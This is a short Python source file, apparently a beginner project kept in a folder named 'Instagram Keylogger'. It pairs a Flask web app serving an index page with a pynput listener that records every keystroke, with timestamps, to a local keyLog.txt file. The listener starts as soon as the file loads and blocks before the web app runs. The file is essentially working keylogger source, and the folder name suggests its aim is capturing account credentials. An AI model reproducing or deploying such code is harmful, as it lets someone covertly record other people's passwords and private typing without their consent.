from flask import Flask, render_template, request
from pynput.keyboard import Key, Listener
import logging


app = Flask(__name__)  # creating the Flask class object


@app.route('/')  # decorator drfines the
def home():
    return render_template('index.html')


log_dir = r"D:\Github\Projects\SheBuilds\Instagram Keylogger"
logging.basicConfig(filename=(log_dir + "keyLog.txt"),
                    level=logging.DEBUG, format='%(asctime)s: %(message)s')


def on_press(key):
    logging.info(str(key))


with Listener(on_press=on_press) as listener:
 listener.join()


if __name__ == '__main__':
    app.run(debug=True)
